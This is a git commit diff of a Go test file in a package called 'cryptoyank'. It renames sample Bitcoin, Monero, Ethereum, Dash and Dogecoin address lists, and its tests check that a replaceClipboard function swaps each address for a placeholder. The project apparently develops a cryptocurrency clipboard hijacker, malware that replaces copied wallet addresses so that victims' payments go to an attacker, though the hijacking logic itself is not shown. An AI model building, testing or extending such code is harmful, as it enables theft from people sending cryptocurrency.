6878deef7edb11ae2e4bb3b1c383e637cc410cbe
Jacques Andre <jacquesandre@mailbox.org>
2022-12-04 17:28:13 +0000

    [cleanup] better testing: allow multiple addresses per test

--- cryptoyank/address_testing_test.go
+++ cryptoyank/address_testing_test.go
@@ -7,17 +7,17 @@ import (
 )
 
 var (
-	XMR_ADDRESSES = []string{"4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge"}
-	BTC_ADDRESSES = []string{"bc1qp3f7vnmuj4pjxpfvkvf7yznac9h9r5arlv4fpv"}
-	ETH_ADDRESSES = []string{"0x71C7656EC7ab88b098defB751B7401B5f6d8976F"}
-	DASH_ADDRESSES = []string{"XpESxaUmonkq8RaLLp46Brx2K39ggQe226"}
-	DOGE_ADDRESSES = []string{"DMuFDCTwxdqzfWrCEE7HiMxBonKVU49Fz4"}
+	XMR_ADDRESSES_TO_TEST = []string{"4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge"}
+	BTC_ADDRESSES_TO_TEST = []string{"bc1qp3f7vnmuj4pjxpfvkvf7yznac9h9r5arlv4fpv"}
+	ETH_ADDRESSES_TO_TEST = []string{"0x71C7656EC7ab88b098defB751B7401B5f6d8976F"}
+	DASH_ADDRESSES_TO_TEST = []string{"XpESxaUmonkq8RaLLp46Brx2K39ggQe226"}
+	DOGE_ADDRESSES_TO_TEST = []string{"DMuFDCTwxdqzfWrCEE7HiMxBonKVU49Fz4"}
 )
 
 
 
 func TestBitcoinMatch(t *testing.T) {
-	for _, address := range BTC_ADDRESSES{
+	for _, address := range BTC_ADDRESSES_TO_TEST{
 		var expected string = "replace_me_btc"
 		actual, err := replaceClipboard(address)
 		assert.Equal(t, actual, expected)
@@ -26,7 +26,7 @@ func TestBitcoinMatch(t *testing.T) {
 }
 
 func TestMoneroMatch(t *testing.T) {
-	for _, address := range XMR_ADDRESSES {
+	for _, address := range XMR_ADDRESSES_TO_TEST {
 		var expected string = "replace_me_xmr"
 		actual, err := replaceClipboard(address)
 		assert.Equal(t, actual, expected)
@@ -35,7 +35,7 @@ func TestMoneroMatch(t *testing.T) {
 }
 
 func TestEthereumMatch(t *testing.T) {
-	for _, address := range ETH_ADDRESSES {
+	for _, address := range ETH_ADDRESSES_TO_TEST {
 		var expected string = "replace_me_eth"
 		actual, err := replaceClipboard(address)
 		assert.Equal(t, actual, expected)
@@ -44,7 +44,7 @@ func TestEthereumMatch(t *testing.T) {
 }
 
 func TestDashMatch(t *testing.T) {
-	for _, address := range DASH_ADDRESSES {
+	for _, address := range DASH_ADDRESSES_TO_TEST {
 		var expected string = "replace_me_dash"
 		actual, err := replaceClipboard(address)
 		assert.Equal(t, actual, expected)
@@ -53,7 +53,7 @@ func TestDashMatch(t *testing.T) {
 }
 
 func TestDogeMatch(t *testing.T) {
-	for _, address := range DOGE_ADDRESSES {
+	for _, address := range DOGE_ADDRESSES_TO_TEST {
 		var expected string = "replace_me_doge"
 		actual, err := replaceClipboard(address)
 		assert.Equal(t, actual, expected)
